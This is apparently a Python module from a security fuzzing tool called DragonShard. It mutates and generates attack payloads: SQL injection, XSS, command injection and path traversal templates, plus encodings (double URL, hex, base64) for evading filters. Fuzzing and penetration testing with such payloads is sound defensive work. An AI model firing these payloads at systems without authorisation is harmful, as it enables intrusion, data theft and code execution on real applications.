"""
DragonShard Payload Mutator Module

Provides payload mutation strategies for enhanced fuzzing.
"""

import logging
import random
import re
import string
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


class PayloadMutator:
    """
    Payload mutation strategies for enhanced fuzzing.
    """

    def __init__(self):
        """Initialize the payload mutator."""
        self.encoding_methods = [
            self._url_encode,
            self._double_url_encode,
            self._html_encode,
            self._hex_encode,
            self._unicode_encode,
            self._base64_encode,
        ]

        self.case_variations = [
            str.upper,
            str.lower,
            str.title,
            lambda s: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s)),
        ]

    def mutate_payload(self, payload: str, mutation_type: str = "random") -> List[str]:
        """
        Mutate a payload using various strategies.

        Args:
            payload: Original payload to mutate
            mutation_type: Type of mutation to apply

        Returns:
            List of mutated payloads
        """
        mutations = []

        if mutation_type == "random":
            mutations.extend(self._random_mutations(payload))
        elif mutation_type == "encoding":
            mutations.extend(self._encoding_mutations(payload))
        elif mutation_type == "case":
            mutations.extend(self._case_mutations(payload))
        elif mutation_type == "all":
            mutations.extend(self._all_mutations(payload))
        else:
            logger.warning(f"Unknown mutation type: {mutation_type}")
            mutations.append(payload)

        return list(set(mutations))  # Remove duplicates

    def _random_mutations(self, payload: str) -> List[str]:
        """Apply random mutations to payload."""
        mutations = [payload]

        # Add random spaces
        if random.random() < 0.3:
            mutations.append(payload.replace("=", " = "))
            mutations.append(payload.replace("'", " ' "))

        # Add random quotes
        if random.random() < 0.3:
            mutations.append(f'"{payload}"')
            mutations.append(f"'{payload}'")

        # Add random encoding
        if random.random() < 0.5:
            mutations.extend(self._encoding_mutations(payload))

        # Add random case variations
        if random.random() < 0.3:
            mutations.extend(self._case_mutations(payload))

        return mutations

    def _encoding_mutations(self, payload: str) -> List[str]:
        """Apply encoding mutations to payload."""
        mutations = [payload]

        for encoder in self.encoding_methods:
            try:
                encoded = encoder(payload)
                if encoded != payload:
                    mutations.append(encoded)
            except Exception as e:
                logger.debug(f"Encoding failed: {e}")

        return mutations

    def _case_mutations(self, payload: str) -> List[str]:
        """Apply case mutations to payload."""
        mutations = [payload]

        for case_func in self.case_variations:
            try:
                mutated = case_func(payload)
                if mutated != payload:
                    mutations.append(mutated)
            except Exception as e:
                logger.debug(f"Case mutation failed: {e}")

        return mutations

    def _all_mutations(self, payload: str) -> List[str]:
        """Apply all mutation strategies."""
        mutations = [payload]
        mutations.extend(self._random_mutations(payload))
        mutations.extend(self._encoding_mutations(payload))
        mutations.extend(self._case_mutations(payload))
        return mutations

    def _url_encode(self, payload: str) -> str:
        """URL encode the payload."""
        import urllib.parse

        return urllib.parse.quote(payload)

    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode the payload."""
        import urllib.parse

        return urllib.parse.quote(urllib.parse.quote(payload))

    def _html_encode(self, payload: str) -> str:
        """HTML encode the payload."""
        html_entities = {"<": "&lt;", ">": "&gt;", "&": "&amp;", '"': "&quot;", "'": "&#39;"}
        encoded = payload
        for char, entity in html_entities.items():
            encoded = encoded.replace(char, entity)
        return encoded

    def _hex_encode(self, payload: str) -> str:
        """Hex encode the payload."""
        return "".join(f"%{ord(c):02x}" for c in payload)

    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode the payload."""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    def _base64_encode(self, payload: str) -> str:
        """Base64 encode the payload."""
        import base64

        return base64.b64encode(payload.encode()).decode()

    def generate_sql_injection_payloads(self, base_payload: str) -> List[str]:
        """Generate SQL injection payload variations."""
        variations = [base_payload]

        # Common SQL injection patterns
        patterns = [
            f"'{base_payload}'",
            f"'{base_payload}--",
            f"'{base_payload}#",
            f"'{base_payload}/*",
            f"({base_payload})",
            f"/*{base_payload}*/",
            f"`{base_payload}`",
            f'"{base_payload}"',
            f"'{base_payload}' OR '1'='1",
            f"'{base_payload}' AND '1'='1",
            f"'{base_payload}' UNION SELECT NULL--",
            f"'{base_payload}' UNION SELECT NULL,NULL--",
        ]

        variations.extend(patterns)
        return list(set(variations))

    def generate_xss_payloads(self, base_payload: str) -> List[str]:
        """Generate XSS payload variations."""
        variations = [base_payload]

        # Common XSS patterns
        patterns = [
            f"<script>{base_payload}</script>",
            f"<img src=x onerror={base_payload}>",
            f"<svg onload={base_payload}>",
            f"<iframe src=javascript:{base_payload}></iframe>",
            f"<body onload={base_payload}>",
            f"javascript:{base_payload}",
            f"data:text/html,<script>{base_payload}</script>",
            f"vbscript:{base_payload}",
            f"<input onfocus={base_payload} autofocus>",
            f"<select onchange={base_payload}><option>1</option></select>",
        ]

        variations.extend(patterns)
        return list(set(variations))

    def generate_command_injection_payloads(self, base_payload: str) -> List[str]:
        """Generate command injection payload variations."""
        variations = [base_payload]

        # Common command injection patterns
        patterns = [
            f"; {base_payload}",
            f"| {base_payload}",
            f"&& {base_payload}",
            f"`{base_payload}`",
            f"$({base_payload})",
            f"& {base_payload}",
            f"|| {base_payload}",
            f"| {base_payload} |",
            f"; {base_payload};",
            f"&& {base_payload} &&",
        ]

        variations.extend(patterns)
        return list(set(variations))

    def generate_path_traversal_payloads(self, base_payload: str) -> List[str]:
        """Generate path traversal payload variations."""
        variations = [base_payload]

        # Common path traversal patterns
        patterns = [
            f"../../../{base_payload}",
            f"..\\..\\..\\{base_payload}",
            f"....//....//....//{base_payload}",
            f"..%2F..%2F..%2F{base_payload}",
            f"..%252F..%252F..%252F{base_payload}",
            f"..%c0%af..%c0%af..%c0%af{base_payload}",
            f"..%255c..%255c..%255c{base_payload}",
            f"/{base_payload}",
            f"C:\\{base_payload}",
            f"file:///{base_payload}",
            f"php://filter/convert.base64-encode/resource={base_payload}",
            f"data://text/plain;base64,{base_payload}",
        ]

        variations.extend(patterns)
        return list(set(variations))

    def smart_mutate(self, payload: str, payload_type: str) -> List[str]:
        """
        Apply smart mutations based on payload type.

        Args:
            payload: Original payload
            payload_type: Type of payload (xss, sqli, etc.)

        Returns:
            List of mutated payloads
        """
        mutations = [payload]

        if payload_type == "sqli":
            mutations.extend(self.generate_sql_injection_payloads(payload))
        elif payload_type == "xss":
            mutations.extend(self.generate_xss_payloads(payload))
        elif payload_type == "command_injection":
            mutations.extend(self.generate_command_injection_payloads(payload))
        elif payload_type == "path_traversal":
            mutations.extend(self.generate_path_traversal_payloads(payload))
        else:
            # Apply general mutations
            mutations.extend(self._all_mutations(payload))

        return list(set(mutations))

    def create_custom_payload(self, template: str, **kwargs) -> str:
        """
        Create a custom payload from a template.

        Args:
            template: Payload template with placeholders
            **kwargs: Values to substitute in template

        Returns:
            Custom payload string
        """
        try:
            return template.format(**kwargs)
        except KeyError as e:
            logger.warning(f"Missing template variable: {e}")
            return template
        except Exception as e:
            logger.warning(f"Template formatting failed: {e}")
            return template

    def generate_payload_combinations(
        self, payloads: List[str], max_combinations: int = 10
    ) -> List[str]:
        """
        Generate combinations of multiple payloads.

        Args:
            payloads: List of base payloads
            max_combinations: Maximum number of combinations to generate

        Returns:
            List of combined payloads
        """
        if len(payloads) <= 1:
            return payloads

        combinations = []

        # Generate random combinations
        for _ in range(min(max_combinations, len(payloads) * 2)):
            if random.random() < 0.5:
                # Concatenate payloads
                combo = "".join(random.sample(payloads, random.randint(2, min(3, len(payloads)))))
                combinations.append(combo)
            else:
                # Join with separators
                separators = [" ", ";", "|", "&", "&&", "||"]
                combo = random.choice(separators).join(
                    random.sample(payloads, random.randint(2, min(3, len(payloads))))
                )
                combinations.append(combo)

        return list(set(combinations))


if __name__ == "__main__":
    # Example usage
    mutator = PayloadMutator()

    # Test basic mutations
    payload = "alert('XSS')"
    mutations = mutator.mutate_payload(payload, "all")
    print(f"Generated {len(mutations)} mutations for '{payload}'")

    # Test smart mutations
    sql_payload = "1 OR 1=1"
    sql_mutations = mutator.smart_mutate(sql_payload, "sqli")
    print(f"Generated {len(sql_mutations)} SQL injection mutations")

    # Test custom payload creation
    custom = mutator.create_custom_payload("alert('{message}')", message="test")
    print(f"Custom payload: {custom}")
